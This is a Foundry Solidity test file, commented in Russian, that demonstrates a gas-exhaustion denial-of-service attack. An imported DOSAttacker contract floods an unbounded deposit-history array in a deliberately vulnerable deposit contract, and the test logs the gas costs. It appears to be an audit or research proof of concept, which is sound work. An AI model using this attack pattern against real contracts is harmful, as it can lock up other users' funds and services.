// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "dura/VulnerableDepositManager.sol";
import "dura/DOSAttacker.sol";

contract DOSAttackTest is Test {
    VulnerableDepositManager public vulnerable;
    DOSAttacker public attacker;
    
    address owner = makeAddr("owner");
    address normalUser = makeAddr("normalUser");
    address attackerAddress = makeAddr("attacker");
    
    function setUp() public {
        // Настраиваем начальные балансы
        vm.deal(owner, 100 ether);
        vm.deal(normalUser, 100 ether);
        vm.deal(attackerAddress, 100 ether);
        
        // Деплоим уязвимый контракт
        vm.prank(owner);
        vulnerable = new VulnerableDepositManager();
        
        // Деплоим атакующий контракт
        vm.prank(attackerAddress);
        attacker = new DOSAttacker(address(vulnerable));
    }
    
    function test_DOSAttackGasExhaustion() public {
        // Переключаемся на аккаунт атакующего
        vm.startPrank(attackerAddress);
        
        // Записываем начальный газ
        uint256 initialGas = gasleft();
        
        // Выполняем DOS атаку: создаем 1000 депозитов за одну транзакцию
        // Это заполнит массив _depositHistory[attacker] 1000 элементами
        attacker.launchDOSAttack{value: 1 ether}(1000);
        
        // Записываем потраченный газ на атаку
        uint256 attackGasUsed = initialGas - gasleft();
        console.log("Gas used for creating 1000 deposits:", attackGasUsed);
        
        // Проверяем, что атака успешна - массив содержит 1000 элементов
        uint256 arraySize = attacker.checkArraySize();
        console.log("Array size after attack:", arraySize);
        assertEq(arraySize, 1000);
        
        // Теперь демонстрируем проблему: попытка прочитать весь массив
        uint256 gasBeforeRead = gasleft();
        
        // Эта попытка должна либо:
        // 1. Исчерпать газ (revert)
        // 2. Потратить огромное количество газа
        try attacker.demonstrateGasExhaustion() returns (bool success) {
            if (success) {
                uint256 gasAfterRead = gasleft();
                uint256 readGasUsed = gasBeforeRead - gasAfterRead;
                console.log("Gas used to read entire array:", readGasUsed);
                
                // Газ для чтения должен быть очень большим
                // (но может не превышать лимит блока в тестовой среде)
                console.log("Gas per element:", readGasUsed / arraySize);
            }
        } catch {
            console.log("Reading array caused revert (gas exhaustion)");
        }
        
        // Демонстрируем влияние на других пользователей
        vm.stopPrank();
        
        // Нормальный пользователь пытается получить информацию о своих депозитах
        vm.startPrank(normalUser);
        vulnerable.deposit{value: 1 ether}();
        
        // Газ для чтения одного депозита должен быть нормальным
        uint256 gasForSingleUser = gasleft();
        (uint256 amount, uint256 timestamp) = vulnerable.getUserDeposit(normalUser, 0);
        uint256 gasSingleUserRead = gasForSingleUser - gasleft();
        console.log("Gas to read single deposit (normal user):", gasSingleUserRead);
        assertEq(amount, 1 ether);
        
        // Но если контракт попытается получить историю атакующего...
        vm.stopPrank();
        
        // Владелец пытается проанализировать контракт
        vm.prank(owner);
        uint256 totalDeposits = vulnerable.getTotalDeposits();
        console.log("Total deposits in contract:", totalDeposits);
        
        // Ключевая проверка: операция с контрактом все еще работает,
        // но чтение истории атакующего потребляет непропорционально много ресурсов
        console.log("DOS Attack successful: Array size =", arraySize);
        console.log("Contract is vulnerable to gas exhaustion attacks");
        
        // Проверяем, что функция depositManyTimes действительно уязвима
        // путем создания еще большей атаки
        vm.startPrank(attackerAddress);
        // Очищаем баланс атакующего для следующей атаки
        vm.deal(attackerAddress, 1 ether);
        
        // Еще более мощная атака (может исчерпать газ в mainnet)
        console.log("\nLaunching larger attack...");
        uint256 gasBeforeLargeAttack = gasleft();
        
        // Внимание: эта атака может исчерпать газ в тестовой среде
        // Уменьшаем количество итераций для теста
        try attacker.launchDOSAttack{value: 0.1 ether}(500) {
            uint256 gasAfterLargeAttack = gasleft();
            uint256 largeAttackGas = gasBeforeLargeAttack - gasAfterLargeAttack;
            console.log("Gas for 500 more deposits:", largeAttackGas);
            
            uint256 finalArraySize = attacker.checkArraySize();
            console.log("Final array size:", finalArraySize);
            
            // Итоговая проверка: массив стал очень большим
            assertGt(finalArraySize, 1000);
            console.log(" DOS vulnerability confirmed");
            console.log(" Array growth is unlimited");
            console.log(" Gas consumption increases linearly with array size");
        } catch {
            console.log("Large attack reverted - gas limit reached");
            console.log(" DOS vulnerability confirmed (gas exhaustion)");
        }
    }
}